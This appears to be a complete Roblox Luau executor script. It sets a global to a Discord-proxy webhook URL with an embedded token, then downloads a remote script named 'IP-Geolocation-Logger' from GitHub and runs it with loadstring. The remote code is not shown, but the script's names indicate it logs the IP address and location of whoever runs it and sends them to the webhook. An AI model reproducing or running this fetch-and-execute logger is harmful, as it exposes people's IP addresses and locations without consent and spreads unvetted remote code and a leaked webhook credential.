getgenv()["Webhook URL"] = "https://webhook.lewisakura.moe/api/webhooks/1442049065863876691/kBjzDO37hqFP58-1_XbeHfOPA7akiLo8U7jPxB00cYi_ejjgMsNrCz35W8MyyYiCpCey"

local success, response = pcall(function()
	return game:HttpGet("https://raw.githubusercontent.com/mcantcode/IP-Geolocation-Logger/refs/heads/main/src/main.luau")
end)

if success then
	loadstring(response)()
else
	return
end


